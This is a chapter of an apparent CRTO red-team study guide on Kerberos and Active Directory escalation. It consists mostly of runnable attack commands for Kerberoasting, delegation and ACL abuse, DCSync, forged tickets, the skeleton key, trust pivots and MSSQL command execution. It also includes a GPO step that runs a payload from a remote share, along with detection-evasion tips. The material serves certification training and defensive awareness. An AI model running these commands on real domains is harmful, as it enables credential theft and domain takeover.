## 12. Kerberos and domain escalation

Kerberos attacks are the core of CRTO. Most of them are a trade: a small, specific directory interaction in exchange for a credential or ticket that unlocks the domain.

### 12.1 Kerberos in 60 seconds

| Step | Exchange | What it proves |
|---|---|---|
| 1 | **AS-REQ / AS-REP** | User proves identity (password/key) → gets a **TGT** encrypted with `krbtgt` |
| 2 | **TGS-REQ / TGS-REP** | User presents TGT → gets a **service ticket (TGS)** encrypted with the service account's key |
| 3 | Service use | Service decrypts the TGS with its own key → trusts the identity inside |

**Consequences you exploit:**
- A service ticket is encrypted with the **service account's** key. Ask for one, crack it offline. → *Kerberoasting*.
- An AS-REP for an account with pre-auth disabled is encrypted with the **user's** key. Ask, crack offline. → *AS-REP roasting*.
- If you have `krbtgt`'s key, you can forge **any** TGT. → *Golden ticket*.
- If you have a service account's key, you can forge a TGS for that service. → *Silver ticket*.
- Delegation lets a service request tickets **on behalf of** users. → *S4U abuse*.

**Encryption types:** RC4-HMAC = `0x17` (uses the NT hash), AES128 = `0x11`, AES256 = `0x12`. RC4 requests are the noisy, well-signatured kind; prefer AES.

### 12.2 Kerberoasting

Any authenticated domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's key — crack it offline.

```text
# Find roastable accounts
powerpick Get-DomainUser -SPN | select cn,samaccountname,serviceprincipalname
powerpick Get-DomainUser | select cn,serviceprincipalname | ? { $_.serviceprincipalname -ne $null }

# Request tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<user> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<user1>,<user2> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /rc4opsec /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
```

```bash
# Operator side
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
```

**OPSEC:**
- Each request is **4769**; RC4 tickets (`0x17`) on an AES-capable domain are anomalous.
- `/rc4opsec` reduces noisy/failed requests; use it.
- **Do not roast every SPN.** Target accounts with admin rights or privileged group membership (BloodHound tells you which).
- Do not request more than a handful in a burst; space them out.
- Cracking is offline and invisible.

### 12.3 AS-REP roasting

Accounts with `DONT_REQ_PREAUTH` return an AS-REP encrypted with the user's key without proving identity.

```text
powerpick Get-DomainUser -PreauthNotRequired | select cn,samaccountname

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<user> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

```bash
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc> -request -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

**OPSEC:** 4768 with pre-auth disabled; low volume, low noise. The ticket is requested without credentials, so it is a lower-risk roast than Kerberoasting.

### 12.4 Delegation

#### Unconstrained delegation

A host trusted for **unconstrained delegation** caches the TGT of anyone who authenticates to it. Coerce a privileged user (or a DC) to authenticate, then extract the TGT.

```text
# Find hosts
powerpick Get-DomainComputer -Unconstrained | select cn,dnshostname
powerpick Get-DomainUser -Properties cn,samaccountname,useraccountcontrol | ? { $_.useraccountcontrol -band 0x80000 } | select cn,samaccountname

# On the delegation host, watch for incoming tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

# Coerce authentication (PrinterBug / PetitPotam) — from another host/context
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /target:<dc-fqdn>
# or SpoolSample.exe <dc> <delegation-host>
# or PetitPotam.exe <dc> <delegation-host>

# Use the captured TGT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

**OPSEC:** coercion (PrinterBug/PetitPotam) is high-signal and often patched; `tgtdeleg` is a local abuse of the delegation host. Monitoring produces Rubeus signatures. Do not run this on a restricted host.

#### Constrained delegation

An account with `msDS-AllowedToDelegateTo` can request tickets to specific services. With protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`), it can impersonate any user via S4U2Self + S4U2Proxy.

```text
# Find
powerpick Get-DomainUser -TrustedToAuth | select cn,samaccountname,msds-allowedtodelegateto
powerpick Get-DomainComputer -TrustedToAuth | select cn,dnshostname,msds-allowedtodelegateto
powerpick Get-DomainObject -Identity <account> -Properties msDS-AllowedToDelegateTo,userAccountControl

# S4U2Self + S4U2Proxy (need the account's key/hash/password)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:<svc-account> /rc4:<hash> /impersonateuser:<admin> /msdsspn:<spn> /altservice:<service> /domain:<domain> /dc:<dc> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:<svc-account> /aes256:<key> /impersonateuser:<admin> /msdsspn:<spn> /altservice:<service> /domain:<domain> /dc:<dc> /nowrap

# Use the resulting TGS
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

**OPSEC:** S4U requests are 4769 with the impersonated user as the target; unusual combinations stand out. Use the narrowest `msdsspn` and only the service you need.

#### Resource-Based Constrained Delegation (RBCD)

If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer (ACL abuse, or a machine account you control with `MachineAccountQuota > 0`), you can make that computer trust your controlled account, then S4U to it.

```text
# 1. Check MachineAccountQuota
powerpick Get-DomainObject -Identity "DC=<domain>,DC=<tld>" -Properties ms-DS-MachineAccountQuota

# 2. Create a controlled computer account
execute-assembly C:\Tools\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make --Domain <domain>

# 3. Write the RBCD attribute on the target (requires the right ACL)
#    Generic approach with the AD module ⚠:
powerpick Set-ADComputer -Identity <target-host> -PrincipalsAllowedToDelegateToAccount EvilComputer$
#    Or set msDS-AllowedToActOnBehalfOfOtherIdentity directly ⚠

# 4. Get a TGT for the controlled computer
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:<pass> /user:EvilComputer$ /domain:<domain>
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<key> /domain:<domain> /nowrap

# 5. S4U to the target service
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /aes256:<key> /impersonateuser:<admin> /msdsspn:cifs/<target-fqdn> /domain:<domain> /dc:<dc> /nowrap

# 6. Use the ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
ls \\<target-fqdn>\c$
```

**OPSEC:** writing the RBCD attribute is **5136** and is high-signal. Remove `msDS-AllowedToActOnBehalfOfOtherIdentity` and the controlled computer account when done. Machine-account creation is also logged.

#### Shadow credentials

If you can write `msDS-KeyCredentialLink` on a user or computer, you can add a key credential and authenticate as that principal with a certificate.

```bash
# Linux / operator side
certipy shadow auto -u <user>@<domain> -p <pass> -account <target> -dc-ip <dc>

# Windows
# Whisker add /target:<target> /domain:<domain> /dc:<dc>
# then Rubeus asktgt /user:<target> /certificate:<base64> /password:<pass> /enctype:aes256 /nowrap
```

**OPSEC:** 5136 (KeyCredentialLink). Remove the added key credential after use.

### 12.5 ACL abuse

ACLs are the most common "quiet" path to Domain Admin. Enumerate, then use the specific right.

```text
powerpick Find-InterestingDomainAcl -ResolveGUIDs
powerpick Get-ObjectAcl -Identity <target> -ResolveGUIDs
powerpick Invoke-ACLScanner -ResolveGUIDs

# ForceChangePassword
powerpick Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose

# AddMember
powerpick Add-DomainGroupMember -Identity "Domain Admins" -Members <user> -Verbose

# WriteDACL — grant yourself DCSync
powerpick Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<tld>" -PrincipalIdentity <user> -Rights DCSync

# WriteDACL — grant all
powerpick Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All

# WriteOwner
powerpick Set-DomainObjectOwner -Identity <target> -OwnerIdentity <user>

# GenericWrite/GenericAll on a user: targeted Kerberoast
powerpick Set-DomainObject -Identity <user> -Set @{serviceprincipalname='nonexistent/foo'}

# GenericAll on a computer: RBCD (Section 12.4)
```

| Right | Effect | OPSEC |
|---|---|---|
| `ForceChangePassword` | Reset password | 4724; noisy but direct |
| `GenericAll` (user) | Set SPN or password | 5136 |
| `GenericAll` (computer) | RBCD | 5136 |
| `AddMember` | Add to group | 4728/4732/4756 |
| `WriteDacl` | Grant yourself rights | 5136 |
| `WriteOwner` | Take ownership | 5136 |
| `AllExtendedRights` | Password reset / DCSync | Varies |

**OPSEC:** every ACL write is 5136 and very visible. Use the narrowest right, revert it, and do not chain ACL writes on a Tier-0 object unless the objective requires it.

### 12.6 DCSync

DCSync abuses directory replication rights to pull password data from a DC as if you were another DC.

```text
# Cobalt Strike
dcsync <domain> <DOMAIN\user>
dcsync <domain> krbtgt

# Mimikatz
mimikatz !lsadump::dcsync /domain:<domain> /user:krbtgt
mimikatz !lsadump::dcsync /domain:<domain> /all

# Operator side
secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt
secretsdump.py <domain>/<user>@<dc> -hashes :<ntlm>
```

**What to pull:** `krbtgt` (golden), machine accounts, service accounts, and any user whose hash unlocks a path. `-all` is loud and unnecessary.

**OPSEC:** **4662** with the replication GUIDs (`DS-Replication-Get-Changes`, `...-All`) is the DCSync signature. Do it from a non-DC host, once, and do not repeat. If you only need one account, ask for one.

### 12.7 Golden, silver, and diamond tickets

#### Golden ticket

Requires: `krbtgt` AES256/NTLM key + domain SID.

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt-aes256> /user:<user> /domain:<domain> /sid:<domain-sid> /nowrap

# With extra SIDs (child → parent, Section 12.10)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt-aes256> /user:Administrator /domain:<child> /sid:<child-sid> /sids:<parent-enterprise-admins-sid> /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

```text
# Mimikatz equivalent
mimikatz kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash-or-aes> /ptt
```

**OPSEC:** a forged TGT has no corresponding 4768, may have an unusual lifetime, and often uses RC4. Prefer AES. Prefer **diamond** if you have a real TGT to modify.

#### Silver ticket

Requires: service account key/hash + domain SID + the service SPN. Forges a **TGS**; no DC interaction.

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/<host-fqdn> /aes256:<service-aes256> /user:<user> /domain:<domain> /sid:<domain-sid> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
ls \\<host-fqdn>\c$
```

```text
mimikatz kerberos::golden /service:cifs /target:<host-fqdn> /rc4:<service-ntlm> /sid:<sid> /user:<user> /ptt
```

**OPSEC:** the DC sees no 4769; the **service** sees a logon. A silver ticket scoped to one service is quieter than a golden ticket, but the service logs may still flag it.

#### Diamond ticket

Modifies a legitimate TGT (obtained with `/tgtdeleg`) using the `krbtgt` AES key, so the ticket looks more like a real one than a golden ticket.

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:<gid> /krbkey:<krbtgt-aes256> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:<extra-sid> /krbkey:<krbtgt-aes256> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:<base64>
```

**OPSEC:** still anomalous (group/SID changes, lifetime), but public guidance favours diamond over golden. Use targeted SIDs, not `-519` everywhere.

### 12.8 Skeleton key

Patches the DC's LSASS so any account accepts a master password.

```text
# On the DC, as SYSTEM
mimikatz !privilege::debug
mimikatz !misc::skeleton

# Then authenticate as anyone with the master password
net use \\<dc>\c$ /user:<domain>\Administrator mimikatz
```

**OPSEC:** patches LSASS on a DC, is highly detectable, does not survive reboot, and is generally a last resort. Avoid on a graded exam unless the objective explicitly requires it.

### 12.9 GPO abuse

If you can create/link/edit GPOs, you can push a payload or configuration to every computer in an OU.

```text
powerpick New-GPO -Name "Evil GPO"
powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=<domain>,DC=<tld>"

powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create `
  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" `
  -Value "C:\Windows\System32\cmd.exe /c \\<server>\share\payload.exe" -Type ExpandString

# Force update on a target
powerpick Invoke-GPUpdate -Computer <host> -Force
```

```text
# SharpGPOAbuse (if available) — add an immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c \\<server>\share\payload.exe" --GPOName "Evil GPO"
```

**OPSEC:** GPO changes are 5136 plus SYSVOL file writes and replicate to every affected host. Very loud. Revert the GPO and links afterward.

### 12.10 Trusts

```text
powerpick Get-DomainTrust
powerpick Get-ForestTrust
powerpick Get-DomainTrust -Domain <other-domain>
nltest /domain_trusts /all_trusts
```

#### Child → parent (extra SIDs)

A child-domain admin can forge a golden ticket with the parent's **Enterprise Admins** SID in the SID history.

```text
# Get the parent Enterprise Admins SID
powerpick Get-DomainGroup -Identity "Enterprise Admins" -Domain <parent> -Properties ObjectSid
powerpick Get-DomainSID -Domain <parent>

# Forge with /sids
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<child-krbtgt-aes> /user:Administrator /domain:<child> /sid:<child-sid> /sids:<parent-enterprise-admins-sid> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
```

**OPSEC:** SID filtering may block this in some trusts; test. Extra SIDs are anomalous.

#### Inbound trust (foreign principals in your domain)

```text
powerpick Get-DomainForeignGroupMember -Domain <trusted-domain>
powerpick Find-ForeignGroup -Domain <trusted-domain>
powerpick Find-ForeignUser -Domain <trusted-domain>
powerpick ConvertFrom-SID <foreign-sid>
```

Get credentials for the foreign principal (DCSync if you have rights in that domain), request a TGT, then a cross-domain TGS:

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<foreign-user> /domain:<foreign-domain> /aes256:<key> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/<trusting-domain> /domain:<foreign-domain> /dc:<foreign-dc> /nowrap /ticket:<tgt>
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/<target-fqdn> /domain:<trusting-domain> /dc:<trusting-dc> /nowrap /ticket:<tgt>
```

#### Outbound trust (your domain trusts another)

```text
# Dump the trust key (noisy)
mimikatz lsadump::trust /patch

# Get the trust object GUID and DCSync it
powerpick Get-DomainObject -Identity "CN=<other-domain>,CN=System,DC=<domain>,DC=<tld>" | select objectGuid
mimikatz @lsadump::dcsync /domain:<domain> /guid:{<guid>}

# Request a TGT as the trust account and pivot into the trusted domain
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<TRUST>$ /domain:<domain> /rc4:<trust-key> /nowrap
```

**OPSEC:** `lsadump::trust /patch` is explicitly *not* OPSEC-safe (it patches LSASS). Prefer DCSync of the trust object. Cross-domain tickets are anomalous; scope them narrowly.

### 12.11 LAPS

LAPS stores local admin passwords in `ms-Mcs-AdmPwd`, readable by delegated principals.

```text
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwd" -ne $null } | select dnsHostName
powerpick Get-DomainComputer -Identity <host> -Properties ms-Mcs-AdmPwd

# Find who can read it
powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
powerpick Find-LAPSDelegatedGroups
powerpick Find-AdmPwdExtendedRights

# Use the password
make_token .\<local-admin> <password>
ls \\<host>\c$

# Backdoor the expiry (extend password lifetime) ⚠
powerpick Set-DomainObject -Identity <host> -Set @{'ms-Mcs-AdmPwdExpirationTime'='136257686710000000'} -Verbose
```

**OPSEC:** reading `ms-Mcs-AdmPwd` is 4662 and may be audited. Extending expiry requires `PwdExpirationProtectionEnabled` to be off; it is a durable change — revert if you make it.

### 12.12 MSSQL

SQL servers are common lateral-movement and privilege-escalation targets.

```text
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powerpick Get-SQLInstanceDomain
powerpick Get-SQLInstanceBroadcast
powerpick Get-SQLConnectionTest -Instance <sql-host> | fl
powerpick Get-SQLServerInfo -Instance <sql-host>
powerpick Get-SQLQuery -Instance <sql-host> -Query "select @@servername"

# SQLRecon
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:info
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:whoami
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:query /c:"select @@version"
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:impersonate
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:iwhoami /i:<sql-login>
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:ixpcmd /i:<sql-login> /c:whoami
```

```sql
-- Enable xp_cmdshell (OPSEC: changes server config)
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Impersonation
EXECUTE AS login = '<sql-login>'; SELECT SYSTEM_USER;
EXECUTE AS login = '<sql-login>'; SELECT IS_SRVROLEMEMBER('sysadmin');

-- Linked servers
SELECT name, is_rpc_out_enabled FROM sys.servers;
EXEC sp_serveroption '<linked>', 'rpc out', 'true';
EXEC ('exec master..xp_cmdshell ''whoami''') AT [<linked>];
```

**OPSEC:** enabling `xp_cmdshell` and changing server options is logged and durable. `Invoke-SQLOSCmd` enables and disables it automatically — public guidance calls that better OPSEC, but it still produces config-change events.

### 12.13 Microsoft Configuration Manager (SCCM)

If SCCM is in scope, it is a high-value path: site systems, network access accounts, and client-push/admin-service lateral movement.

```text
# Enumeration (SharpSCCM ⚠)
SharpSCCM.exe local
SharpSCCM.exe get sites
SharpSCCM.exe get users
SharpSCCM.exe get naa
SharpSCCM.exe get class --class SMS_SCI_SysResUse

# Lateral movement (requires rights)
SharpSCCM.exe invoke client-push --target <host>
SharpSCCM.exe invoke admin-service --target <host>
```

**OPSEC:** SCCM traffic and logs are visible; client push creates a service/process on the target and is high-signal. Treat SCCM hosts as Tier 0.

### 12.14 OPSEC summary for domain escalation

| Action | Detection | Safer option |
|---|---|---|
| Kerberoast | 4769 RC4 | `/rc4opsec`, target few accounts |
| AS-REP roast | 4768 pre-auth off | Low volume |
| DCSync | 4662 replication GUIDs | One account, once, non-DC host |
| Golden ticket | No 4768, lifetime, RC4 | Diamond, AES, narrow SIDs |
| Silver ticket | Service-side logon | Scope to one service |
| ACL write | 5136 | Narrow right; revert |
| RBCD / shadow creds | 5136 | Remove attribute/key after |
| Skeleton key | LSASS patch | Avoid |
| GPO abuse | 5136 + SYSVOL | Revert GPO |
| Trust key dump | LSASS patch | DCSync trust object |
| LAPS read | 4662 | Only the host you need |

### 12.15 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Wrong SPN/FQDN | Use `cifs/<fqdn>`; verify with `setspn` |
| `KRB_AP_ERR_SKEW` | Clock skew | Sync time with the DC |
| S4U fails | No protocol transition / wrong key | Check `userAccountControl`; use the right hash |
| DCSync access denied | Missing replication rights | Check ACLs in BloodHound; get WriteDacl first |
| Golden ticket rejected | Wrong SID/AES key, or PAC validation | Verify domain SID; use AES256; check `/sids` |
| RBCD write denied | No write on `msDS-AllowedToActOnBehalfOfOtherIdentity` | Find the ACL; use a different target |
| Kerberoast hash won't crack | AES-only / strong password | Use `-m 19700`; expand wordlist |
| Cross-domain TGS fails | SID filtering / wrong service | Request the exact SPN; check trust direction |

